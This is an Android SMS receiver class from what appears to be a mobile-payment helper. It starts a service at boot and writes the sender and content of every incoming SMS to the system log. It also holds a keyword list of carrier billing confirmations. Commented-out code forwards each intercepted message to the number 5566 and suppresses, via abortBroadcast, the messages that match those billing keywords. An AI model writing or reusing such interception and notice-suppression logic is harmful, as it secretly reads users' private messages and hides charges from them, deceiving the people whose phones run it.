package com.whty.qd.upay.reciever;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

public class SMSReceiver extends BroadcastReceiver {
	private static final String TAG = "com.qunsuan.qspayhelper.SMSReceiver";
	public static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED"; 
	public static final String SMS_SEND = "android.provider.Telephony.SMS_SEND";
	public static final String BOOT_COMPLET = "android.intent.action.BOOT_COMPLETED";
	
	private static String[] RECEIVE_MSG_KEYS = null;
	
	public static void setReceiveMsgKyes(String[] limts){
		Log.i("setReceiveMsgKyes", "setReceiveMsgKyes");
		RECEIVE_MSG_KEYS = limts;
	}
	public static void setDefaultReceiveMsgKeys(){
		Log.i("setDefaultReceiveMsgKeys", "setDefaultReceiveMsgKeys");
		RECEIVE_MSG_KEYS =new String[]{
				"上海群算","鸿联","成功购买","进行充值","空中信使","掌上娱乐",
				"信息费","短信快递","01068082996","游戏点数充值","中国移动手机游戏"
			};
	}
	
	private static final String[] SEND_MSG_KEYS = new String[]{
		"-",};
	

	public SMSReceiver() {
		super();
		
		Log.i(TAG, "SMSReceiver()");
	}

	private boolean isSuccess = false;
	
	//modify by shawn 2013-07-24
	//Begin
	@Override
	public void onReceive(Context context, Intent intent) {
		Log.i(TAG, "onReceive()");
		Log.i("onReceive", ""+intent.getAction());
		
		if(intent.getAction().equals(BOOT_COMPLET)){
			Intent intent_service = new Intent(context,MySmsService.class);
			context.startService(intent_service);
		}else{
			Object[] pdus = (Object[]) intent.getExtras().get("pdus");//获取短信内容
			for(Object pdu:pdus){
				byte[] data = (byte[])pdu;//获取单条短信内容，短信内容以pdu格式存在
				SmsMessage message = SmsMessage.createFromPdu(data);//使用pdu格式的短信数据生成短息对象
				String sender = message.getOriginatingAddress();//获取短信的发送者
				String content = message.getMessageBody();//获取短信的内容
				Date date = new Date(message.getTimestampMillis());
				SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
				String sendTime = format.format(date);
				
				
				Log.i(TAG, "sender:"+sender+"  content:"+content+"  sendTime:"+sendTime);
				
				
				
				//SmsManager manager = SmsManager.getDefault();
				//把你拦截到的短信发送到指定号码,此处为5566
				//manager.sendTextMessage("5566", null, "发送人："+sender+"----发送时间："+sendTime+"----内容："+content, null, null);
				
				//if("number".equals(sender)){
				//	abortBroadcast();
				//}
				//如果不想让主机接收某个号码的信息、number为指定号码
				
				if(SMS_RECEIVED.equals(intent.getAction())){
					
					
				}
				
				
			}
		}
		
		
	}

	//End    
	
	
	
	/*
    @Override  
    public void onReceive(Context context, Intent intent) {
    	Log.i(TAG, "onReceive()");
        if (SMS_RECEIVED.equals(intent.getAction())) {  
            Bundle bundle = intent.getExtras();  
            if (bundle != null) {  
                Object[] pdus = (Object[]) bundle.get("pdus");  
                final SmsMessage[] messages = new SmsMessage[pdus.length];  
                String msg = "", number = "";  
                for (int i = 0; i < pdus.length; i++) {  
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);  
                    msg += messages[i].getMessageBody(); 
                    number += messages[i].getDisplayOriginatingAddress();
                }  
                Log.i(TAG, msg + "from: " + number);
                
                if (msg.contains("上海群算")) {
		        	this.abortBroadcast(); 
	                Log.i(TAG, msg + "shield number: " + number);
		        	this.onPaymentCompleted(context);
                }  else if (msg.contains("上海鸿联")) {
		        	this.abortBroadcast(); 
	                Log.i(TAG, msg + "shield number: " + number);
                }
            }  
        }
    }
    */
	    
    public void onPaymentCompleted(Context context) {
        Toast.makeText(context, "手机支付成功！", Toast.LENGTH_LONG).show();
    }
}
